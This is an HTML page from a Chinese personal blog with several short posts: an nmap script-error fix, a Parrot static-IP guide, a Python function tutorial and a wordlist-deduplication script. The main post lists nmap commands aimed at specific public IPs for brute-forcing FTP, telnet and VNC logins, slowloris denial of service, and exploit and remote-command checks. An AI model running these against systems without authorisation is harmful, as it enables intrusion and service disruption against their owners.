@@ -1,0 +1,1313 @@
+
+ <!DOCTYPE HTML>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  
+    <title>Bug&#39;小虫</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="小虫">
+    
+
+    
+    <meta name="description" content="hark">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Bug&#39;小虫">
+<meta property="og:url" content="http://yoursite.com/page/6/index.html">
+<meta property="og:site_name" content="Bug&#39;小虫">
+<meta property="og:description" content="hark">
+<meta property="og:locale" content="zh-CN">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Bug&#39;小虫">
+<meta name="twitter:description" content="hark">
+
+    
+    <link rel="alternative" href="/atom.xml" title="Bug&#39;小虫" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/jacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+
+  <body>
+    <header>
+      
+<div>
+		
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="Bug&#39;小虫">Bug&#39;小虫</a></h1>
+				<h2 class="blog-motto">走过黑暗，前面便是光</h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜单">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+					<li>
+ 					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="搜索" />
+						<input type="hidden" name="q" value="site:yoursite.com">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main">
+
+   
+    
+    <article class="post-expand [layout]" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2016/01/01/nmap执行脚本报错/" title="nmap执行脚本报错" itemprop="url">nmap执行脚本报错</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
+		
+  <p class="article-time">
+    <time datetime="2016-01-01T02:10:50.000Z" itemprop="datePublished"> 发表于 2016-01-01</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <p>NMAP执行脚本smb-check-vulns.nse出错</p>
+<p>错误信息：NSE: failed to initialize the script engine:<br>/usr/bin/../share/nmap/nse_main.lua:801: ‘smb-check-vulns.nse’ did not match a category, filename, or directory<br>这是由于从nmap  6.4.9beta6开始，smb-check-vulns.nse脚本被取消了。它被分为smb-vuln-conficker、•smb-vuln-cve2009-3103、smb-vuln-ms06-025、smb-vuln-ms07-029、smb-vuln-reg svc-dos、smb-vuln-ms08-067这六个脚本。用户根据需要选择对应的脚本。如果不确定执行哪一个，可以使用smb-vuln-*.nse来指定所有的脚本文件。</p>
+
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/工具/">工具</a>
+</div>
+
+
+</div>
+
+
+
+
+<div class="comments-count">
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand [layout]" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2016/01/01/nmap漏洞扫描总结/" title="nmap漏洞扫描总结" itemprop="url">nmap漏洞扫描总结</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
+		
+  <p class="article-time">
+    <time datetime="2016-01-01T02:10:50.000Z" itemprop="datePublished"> 发表于 2016-01-01</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <p>1 http 拒绝服务<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap –max-parallelism 800–script http-slowloris scanme.nmap.org</span><br></pre></td></tr></table></figure></p>
+<p>2 IIS 短文件泄露<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 8080 –script http-iis-short-name-brute 61.142.64.176</span><br></pre></td></tr></table></figure></p>
+<p>3 ftp弱口令暴力破解<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap –script ftp-brute –script-args brute.emptypass=<span class="literal">true</span>,ftp-brute.timeout=30,userdb=/root/dirtionary/usernames.txt,brute.useraspass=<span class="literal">true</span>,passdb=/root/dirtionary/passwords.txt,brute.threads=3,brute.delay=6 203.195.139.153</span><br></pre></td></tr></table></figure></p>
+<p>4 检测CVE-2011-2523中的ftp-vsftpd-backdoor<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T2 –script ftp-vsftpd-backdoor 211.139.201.240</span><br></pre></td></tr></table></figure></p>
+<p>5 验证http中开启的-methods 方法<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T3 –script http-methods –script-args http.test-all=<span class="literal">true</span>,http.url-path=/www.haoshangjia.com</span><br></pre></td></tr></table></figure></p>
+<p>6 验证HTTP.sys 远程代码执行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV –script http-vuln-cve2015-1635 203.195.139.153</span><br></pre></td></tr></table></figure></p>
+<p>7验证 SSL POODLE information leak<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p 443 –version-light –script ssl-poodle 218.19.141.16</span><br></pre></td></tr></table></figure></p>
+<p>8 验证http 中开启了put 方法<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap –script http-put –script-args http-put.url=/uploads/testput.txt,http-put.file=/root/put.txt 218.19.141.16</span><br></pre></td></tr></table></figure></p>
+<p>9 验证mysql 匿名访问<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap –script mysql-empty-password 203.195.139.153</span><br></pre></td></tr></table></figure></p>
+<p>10 验证cve2015-1427 漏洞<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap –script http-vuln-cve2015-1427 –script-args <span class="built_in">command</span>=ls 203.195.139.153</span><br></pre></td></tr></table></figure></p>
+<p>11 验证cve2014-8877漏洞<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn –script http-vuln-cve2014-8877 –script-args http-vuln-cve2014-8877.cmd=dir,http-vuln-cve2014-8877.uri=/wordpress 42.96.170.128</span><br></pre></td></tr></table></figure></p>
+<p>12 验证Cisco ASA中的CVE-2014-2126,CVE-2014-2127,CVE-2014-21,CVE-2014-2129漏洞<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 443 –script http-vuln-cve2014-2126,http-vuln-cve2014-2127,http-vuln-cve2014-2128,http-vuln-cve2014-2129 203.195.139.153</span><br></pre></td></tr></table></figure></p>
+<p>13验证低安全的 SSHv1，sslv2协议<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap –script sshv1,sslv2 www.haoshangjia.com</span><br></pre></td></tr></table></figure></p>
+<p>14 验证CVE-2014-0224 ssl-ccs-injection<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn –script ssl-ccs-injection 203.195.139.153</span><br></pre></td></tr></table></figure></p>
+<p>15 验证ssl-cert证书问题<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -v -v –script ssl-cert 203.195.139.153</span><br></pre></td></tr></table></figure></p>
+<p>16验证SSL证书的有限期<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn –script ssl-date www.haoshangjia.com</span><br></pre></td></tr></table></figure></p>
+<p>17 验证CVE-2014-0160 OpenSSL Heartbleed bug<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 443 –script ssl-heartbleed,ssl-known-key 203.195.139.153</span><br></pre></td></tr></table></figure></p>
+<p>18 验证 Debian OpenSSL keys<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 443 –script ssl-known-key 203.195.139.153</span><br></pre></td></tr></table></figure></p>
+<p>18 验证弱加密SSL套件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap –script ssl-enum-ciphers 203.195.139.153</span><br></pre></td></tr></table></figure></p>
+<p>20 验证CVE 2015-4000<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap –script ssl-dh-params www.haoshangjia.com</span><br></pre></td></tr></table></figure></p>
+<p>21 验证多种SSL漏洞问题<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 203.195.139.153 –vv –script sshv1,ssl-ccs-injection,ssl-cert,ssl-date,ssl-dh-params,ssl-enum-ciphers,ssl-google-cert-catalog,ssl-heartbleed,ssl-known-key,sslv2</span><br></pre></td></tr></table></figure></p>
+<p>22 在网络中检测某主机是否存在窃听他人流量<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap –script sniffer-detect 10.10.167.5</span><br></pre></td></tr></table></figure></p>
+<p>23 暴力破解telnet<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 23 –script telnet-brute –script-args userdb=myusers.lst,passdb=mypwds.lst –script-args telnet-brute.timeout=8s 203.195.139.153</span><br></pre></td></tr></table></figure></p>
+<p>24 验证telnet是否支持加密<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap –script telnet-encryption 203.195.139.153</span><br></pre></td></tr></table></figure></p>
+<p>25 精准地确认端口上运行的服务<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV –script unusual-port 42.96.170.128</span><br></pre></td></tr></table></figure></p>
+<p>26 收集VNC信息<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap –script vnc-info 203.195.139.153</span><br></pre></td></tr></table></figure></p>
+<p>27 暴力破解VNC<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap –script vnc-brute –script-args brute.guesses=6,brute.emptypass=<span class="literal">true</span>,userdb=/root/dictionary/user.txt,brute.useraspass=<span class="literal">true</span>,passdb=/root/dictionary/pass.txt,brute.retries=3,brute.threads=2,brute.delay=3 42.96.170.128</span><br></pre></td></tr></table></figure></p>
+<p>这个脚本挺长的，很多详细的参数，请参阅脚本的具体参数。</p>
+<p>0x03 使用系列的nmap NSE 进行检查<br>nmap脚本主要分为以下几类，在扫描时可根据需要设置–script=类别这种方式进行比较笼统的扫描：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">auth: 负责处理鉴权证书（绕开鉴权）的脚本</span><br><span class="line">broadcast: 在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务</span><br><span class="line">brute: 提供暴力破解方式，针对常见的应用如http/snmp等</span><br><span class="line">default: 使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力</span><br><span class="line">discovery: 对网络进行更多的信息，如SMB枚举、SNMP查询等</span><br><span class="line">dos: 用于进行拒绝服务攻击</span><br><span class="line">exploit: 利用已知的漏洞入侵系统</span><br><span class="line">external: 利用第三方的数据库或资源，例如进行whois解析</span><br><span class="line">fuzzer: 模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞</span><br><span class="line">intrusive: 入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽</span><br><span class="line">malware: 探测目标机是否感染了病毒、开启了后门等信息</span><br><span class="line">safe: 此类与intrusive相反，属于安全性脚本</span><br><span class="line">version: 负责增强服务与版本扫描（Version Detection）功能的脚本</span><br><span class="line">vuln: 负责检查目标机是否有常见的漏洞（Vulnerability）</span><br></pre></td></tr></table></figure></p>
+<p>Nmap提供的脚本命令行参数如下：<br>-sC: 等价于–script=default，使用默认类别的脚本进行扫描。<br>–script=: 使用某个或某类脚本进行扫描，支持通配符描述<br>–script-args=<br>nmap –sC 203.195.139.153<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">5 使用nmap 进行信息挖掘</span><br><span class="line">```bash</span><br><span class="line">nmap –script discovery 203.195.139.153</span><br></pre></td></tr></table></figure></p>
+<p>6 使用nmap 进行拒绝服务攻击<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap –script dos 203.195.139.153</span><br></pre></td></tr></table></figure></p>
+<p>7 使用nmap 利用已知的漏洞入侵系统<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap –script exploit 203.195.139.153</span><br></pre></td></tr></table></figure></p>
+<p>8 使用nmap 进行利用第三方的数据库或资源进行信息收集或者攻击<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap –script external 203.195.139.153</span><br></pre></td></tr></table></figure></p>
+<p>9 使用nmap 进行模糊测试，发送异常的包到目标机，探测出潜在漏洞<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap –script fuzzer 203.195.139.153</span><br></pre></td></tr></table></figure></p>
+<p>10 使用nmap 进行入侵，此类脚本可能引发对方的IDS/IPS的记录或屏蔽<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap –script intrusive 203.195.139.153</span><br></pre></td></tr></table></figure></p>
+<p>11 使用nmap 探测目标机是否感染了病毒、开启了后门等信息<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap –script malware 203.195.139.153</span><br></pre></td></tr></table></figure></p>
+<p>12 使用nmap 对系统进行安全检查<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap –script safe 203.195.139.153</span><br></pre></td></tr></table></figure></p>
+<p>13 使用nmap 对目标机进行检查是否存在常见的漏洞<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap –script vuln 203.195.139.153</span><br></pre></td></tr></table></figure></p>
+<p>14 使用nmap 负责增强服务与版本扫描（Version Detection）功能的脚本</p>
+<p>nmap –script version 203.195.139.153</p>
+
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/工具/">工具</a>
+</div>
+
+
+</div>
+
+
+
+
+<div class="comments-count">
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand [layout]" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2016/01/01/parrot设置固定IP/" title="parrot设置固定IP" itemprop="url">parrot设置固定IP</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
+		
+  <p class="article-time">
+    <time datetime="2016-01-01T02:10:50.000Z" itemprop="datePublished"> 发表于 2016-01-01</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <h2 id="修改-etc-network-interfaces文件"><a href="#修改-etc-network-interfaces文件" class="headerlink" title="修改/etc/network/interfaces文件"></a>修改/etc/network/interfaces文件</h2><p>在终端输入命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim  /etc/network/interfaces</span><br></pre></td></tr></table></figure></p>
+<p>修改文件的内容如下：</p>
+<p><img src="http://pcf9imvwz.sabkt.gdipper.com/1.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<h2 id="修改-etc-resolv-conf文件"><a href="#修改-etc-resolv-conf文件" class="headerlink" title="修改/etc/resolv.conf文件"></a>修改/etc/resolv.conf文件</h2><p>在终端输入命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/resolv.conf</span><br></pre></td></tr></table></figure></p>
+<p>向其中修改如下的内容：</p>
+<p><img src="http://pcf9imvwz.sabkt.gdipper.com/2.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<p>重启：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reboot</span><br></pre></td></tr></table></figure></p>
+
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/杂七杂八/">杂七杂八</a>►<a class="article-category-link" href="/categories/杂七杂八/parrot/">parrot</a>
+</div>
+
+
+</div>
+
+
+
+
+<div class="comments-count">
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand [layout]" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2016/01/01/python之def的用法/" title="python之def的用法" itemprop="url">python之def的用法</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
+		
+  <p class="article-time">
+    <time datetime="2016-01-01T02:10:50.000Z" itemprop="datePublished"> 发表于 2016-01-01</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <h2 id="python之def函数"><a href="#python之def函数" class="headerlink" title="python之def函数"></a>python之def函数</h2><p>如果我们用代码实现了一个小功能，但想要在程序代码中重复使用，不能在代码中到处粘贴这些代码，因为这样做违反 了软件工程中DRY原则。Python提供了函数功能，可以将我们这部分功能抽象成一个函数以方便程序调用，或者提供给其他模块使用。</p>
+<h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def function_name(parameters):</span><br><span class="line">    expressions</span><br></pre></td></tr></table></figure>
+<p>Python 使用 def 开始函数定义，紧接着是函数名，括号内部为函数的参数，内部为函数的 具体功能实现代码，如果想要函数有返回值, 在 expressions 中的逻辑代码中用 return 返回。</p>
+<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def <span class="keyword">function</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'This is a function'</span>)</span><br><span class="line">    a = 1+2</span><br><span class="line">    <span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure>
+<p>上面我们定义了一个名字为 function 的函数，函数没有不接受参数，所以括号内部为空，紧接着就是 函数的功能代码。如果执行该脚本，发现并没有输出任何输出，因为我们只定义了函数，而并没有执行函数。 这时我们在 Python 命令提示符中输入函数调用 function(), 注意这里调用函数的括号不能省略。那么 函数内部的功能代码将会执行，输出结果：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">This is a <span class="keyword">function</span></span><br><span class="line">3</span><br></pre></td></tr></table></figure></p>
+<p>如果我们想要在脚本中调用的脚本，只需要在脚本中最后添加函数调用语句<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span>()</span><br></pre></td></tr></table></figure></p>
+<p>那么在执行脚本的时候，将会执行函数。</p>
+<h2 id="def函数参数"><a href="#def函数参数" class="headerlink" title="def函数参数"></a>def函数参数</h2><p>我们在使用的调用函数的时候，想要指定一些变量的值在函数中使用，那么这些变量就是函数的参数，函数调用的时候， 传入即可。</p>
+<h3 id="基本使用-1"><a href="#基本使用-1" class="headerlink" title="基本使用"></a>基本使用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 def function_name(parameters):</span><br><span class="line">2     expressions</span><br></pre></td></tr></table></figure>
+<p>parameters 的位置就是函数的参数，在调用的时候传入即可。</p>
+<h3 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def func(a, b):</span><br><span class="line">    c = a+b</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'the c is '</span>, c)</span><br></pre></td></tr></table></figure>
+<p>在这里定义的一个函数，其参数就是两个数值，函数的功能就是把两个参数加起来。运行脚本后，在 Python 提示符内调用函数 func, 如果不指定参数 func(), 那么将会出错; 输出 func(1, 2)，将 a=1, b=2 传入函数，输出 the c is 3 。所以在调用函数时候，参数个数和位置一定要按照函数定义。如果我们忘记了函数的参数的位置，只知道各个参数的名字，可以在 函数调用的过程中给指明特定的参数 func(a=1, b=2), 这样的话，参数的位置将不受影响，所以 func(b=2,a=1)是同样的 的效果。</p>
+<h2 id="def函数默认参数"><a href="#def函数默认参数" class="headerlink" title="def函数默认参数"></a>def函数默认参数</h2><p>我们在定义函数时有时候有些参数在大部分情况下是相同的，只不过为了提高函数的适用性，提供了一些备选的参数， 为了方便函数调用，我们可以将这些参数设置为默认参数，那么该参数在函数调用过程中可以不需要明确给出。</p>
+<h3 id="基本使用-2"><a href="#基本使用-2" class="headerlink" title="基本使用"></a>基本使用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def function_name(para_1,...,para_n=defau_n,..., para_m=defau_m):</span><br><span class="line">    expressions</span><br></pre></td></tr></table></figure>
+<p>函数声明只需要在需要默认参数的地方用 = 号给定即可, 但是要注意所有的默认参数都不能出现在非默认参数的前面。</p>
+<h3 id="实例-2"><a href="#实例-2" class="headerlink" title="实例"></a>实例</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def sale_car(price, color=<span class="string">'red'</span>, brand=<span class="string">'carmy'</span>, is_second_hand=True):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'price'</span>, price,</span><br><span class="line">          <span class="string">'color'</span>, color,</span><br><span class="line">          <span class="string">'brand'</span>, brand,</span><br><span class="line">          <span class="string">'is_second_hand'</span>, is_second_hand,)</span><br></pre></td></tr></table></figure>
+<p>在这里定义了一个 sale_car 函数，参数为车的属性，但除了 price 之外，像 color, brand 和 is_second_hand 都是有默认值的，如果我们调用函数 sale_car(1000), 那么与 sale_car(1000, ‘red’, ‘carmy’, True) 是一样的效果。当然也可以在函数调用过程中传入特定的参数用来修改默认参数。通过默认参数可以减轻我们函数调用的复杂度。<br>形参、实参与局部变量、全局变量的关系。</p>
+<p>​答：首先明确，变量是一个更大的范围。</p>
+<p>所有的形参都是局部变量，所有的实参都是全局变量。用集合的角度来说，就是形参是局部变量的子集，实参是全局变量的子集。</p>
+<p>这里解释一下为什么形参都是局部变量。</p>
+<p>​形参是局部变量，全局变量在程序开始时创建并分配空间，在程序结束时候释放内存并销毁，局部变量是在函数调用的时候创建，在函数调用结束后销毁并释放，形参在函数调用时才分配空间，在函数调用后释放，所以是局部变量。</p>
+
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/编程开发/">编程开发</a>►<a class="article-category-link" href="/categories/编程开发/Python/">Python</a>
+</div>
+
+
+</div>
+
+
+
+
+<div class="comments-count">
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand [layout]" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2016/01/01/python实现数据去重复/" title="python实现数据去重复" itemprop="url">python实现数据去重复</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
+		
+  <p class="article-time">
+    <time datetime="2016-01-01T02:10:50.000Z" itemprop="datePublished"> 发表于 2016-01-01</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line">import sys, re, os  <span class="comment">#调用sys,re,os模块</span></span><br><span class="line"> </span><br><span class="line">def getDictList(dict):</span><br><span class="line">	regx = <span class="string">''</span><span class="string">'[\w\~`\!\@\#\$\%\^\&amp;\*\(\)\_\-\+\=\[\]\&#123;\&#125;\:\;\,\.\/\&lt;\&gt;\?]+'</span><span class="string">''</span></span><br><span class="line">	with open(dict) as f:</span><br><span class="line">		data = f.read()</span><br><span class="line">		<span class="built_in">return</span> re.findall(regx, data)</span><br><span class="line">  </span><br><span class="line">def rmdp(dictList):</span><br><span class="line">	<span class="built_in">return</span> list(<span class="built_in">set</span>(dictList))</span><br><span class="line">  </span><br><span class="line">def fileSave(dictRmdp, out):</span><br><span class="line">	with open(out, <span class="string">'a'</span>) as f:</span><br><span class="line">		<span class="keyword">for</span> line <span class="keyword">in</span> dictRmdp:</span><br><span class="line">			f.write(line + <span class="string">'\n'</span>)</span><br><span class="line">  </span><br><span class="line">def main():</span><br><span class="line">	try:</span><br><span class="line">		dict = sys.argv[1].strip()</span><br><span class="line">		out = sys.argv[2].strip()</span><br><span class="line">	except Exception, e:</span><br><span class="line">		<span class="built_in">print</span> <span class="string">'error:'</span>, e</span><br><span class="line">		me = os.path.basename(__file__)</span><br><span class="line">		<span class="built_in">print</span> <span class="string">'usage: %s &lt;input&gt; &lt;output&gt;'</span> %me</span><br><span class="line">		<span class="built_in">print</span> <span class="string">'example: %s dict.txt dict_rmdp.txt'</span> %me</span><br><span class="line">		<span class="built_in">exit</span>()</span><br><span class="line">  </span><br><span class="line">	dictList = getDictList(dict)</span><br><span class="line">	dictRmdp = rmdp(dictList)</span><br><span class="line">	fileSave(dictRmdp, out)</span><br><span class="line">	  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure>
+        
+        
+        <p class="article-more-link">
+          
